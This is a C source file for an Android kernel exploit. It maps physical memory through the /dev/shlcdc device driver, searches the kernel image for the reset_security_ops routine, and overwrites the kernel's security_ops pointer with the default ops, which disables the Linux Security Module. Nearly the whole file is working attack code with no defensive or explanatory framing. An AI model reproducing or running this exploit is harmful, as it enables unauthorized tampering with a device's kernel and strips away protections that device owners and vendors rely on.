/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>
#include <signal.h>

#define KERNEL_BASE_ADDRESS 0x200000
#define MAPPED_OFFSET 0x5000000 /* 0x90000000 - 0x8B0000000 */
#define PHYS_OFFSET 0x80000000

static uint32_t reset_security_ops_asm[] = { 0xe59f2008, 0xe59f3008, 0xe5832000, 0xe12fff1e };
static size_t reset_security_ops_asm_length = sizeof(reset_security_ops_asm);
static uint32_t PAGE_OFFSET = (0xC0000000 - KERNEL_BASE_ADDRESS - MAPPED_OFFSET);

static void *
convert_to_kernel_address(void *address, void *mmap_base_address)
{
  return address - mmap_base_address + (void*)PAGE_OFFSET;
}

static void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (address - (void*)PAGE_OFFSET);
}

static void
dump(void *address, void *base_address)
{
  int i;
  uint32_t *value = (uint32_t*)address;

  for (i = 0; i < 16; i++) {
    if (i % 4 == 0) {
      printf("\n%p ", convert_to_kernel_address(value, base_address));
    }
    printf("%08x ", *value);
    value++;
  }
  printf("\n");
  printf("\n");
}

static void *
find_reset_security_ops(void *mem, size_t length)
{
  void *reset_security_ops;

  reset_security_ops = memmem(mem, length, &reset_security_ops_asm, reset_security_ops_asm_length);
  if (!reset_security_ops) {
    printf("Couldn't find reset_security_ops address\n");
    return NULL;
  }

  printf("Found reset_security_ops at %p\n", convert_to_kernel_address(reset_security_ops, mem));
  dump(reset_security_ops, mem);

  return reset_security_ops;
}

static void *
find_default_security_ops(void *mem, size_t length)
{
  void **default_security_ops;
  void *reset_security_ops;

  reset_security_ops = memmem(mem, length, &reset_security_ops_asm, reset_security_ops_asm_length);
  if (!reset_security_ops) {
    printf("Couldn't find reset_security_ops address\n");
    return NULL;
  }

  default_security_ops = (void*)(reset_security_ops + reset_security_ops_asm_length);
  printf("Found default_security_ops at %p\n", default_security_ops);
  dump(reset_security_ops, mem);

  dump(*default_security_ops, mem);
  return convert_to_kernel_address(*default_security_ops, mem);
}

static void *
get_default_security_ops(void *reset_security_ops, void *mmap_base_address)
{
  void **default_security_ops;
  void *converted_default_security_ops;

  default_security_ops = (void*)(reset_security_ops + reset_security_ops_asm_length);
  printf("Found default_security_ops at %p\n", *default_security_ops);

  converted_default_security_ops = convert_to_mmaped_address(*default_security_ops, mmap_base_address);
  dump(converted_default_security_ops, mmap_base_address);

  return converted_default_security_ops;
}

static void *
get_security_ops(void *reset_security_ops, void *mmap_base_address)
{
  void **security_ops;
  void *converted_security_ops;

  security_ops = (void*)(reset_security_ops + reset_security_ops_asm_length + 4);
  printf("Found security_ops at %p\n", *security_ops);

  converted_security_ops = convert_to_mmaped_address(*security_ops, mmap_base_address);
  dump(converted_security_ops, mmap_base_address);

  return converted_security_ops;
}

static bool
change_security_ops_to_default(void *mmap_address, size_t length)
{
  void *default_security_ops;
  void *reset_security_ops;
  void *security_ops;
  void **security_ops_pointer;

  reset_security_ops = find_reset_security_ops(mmap_address, length);
  if (!reset_security_ops) {
    return false;
  }

  default_security_ops = get_default_security_ops(reset_security_ops, mmap_address);
  security_ops = get_security_ops(reset_security_ops, mmap_address);

  security_ops_pointer = (void*)security_ops;
  printf("Changed security_ops to default_security_ops(%p)\n",
         convert_to_kernel_address(default_security_ops, mmap_address));
  *security_ops_pointer = convert_to_kernel_address(default_security_ops, mmap_address);
  dump(security_ops, mmap_address);

  return true;
}

static bool
set_default_security_ops(void)
{
  int fd;
  void *mmap_address = NULL;
  void *start_address = (void*)0x10000000;
  bool success = false;

  fd = open("/dev/shlcdc", O_RDWR);
  if (fd < 0) {
    return false;
  }

  mmap_address = mmap(start_address, PHYS_OFFSET, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, 0);
  if (mmap_address == MAP_FAILED) {
    printf("Failed to mmap due to %s\n", strerror(errno));
    goto close;
  }

  success = change_security_ops_to_default((void*)PHYS_OFFSET, 0x10000000);

  munmap(start_address, PHYS_OFFSET);

close:
  close(fd);

  return success;
}

int
main(int argc, char **argv)
{
  set_default_security_ops();

  kill(getpid(), SIGKILL);
  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
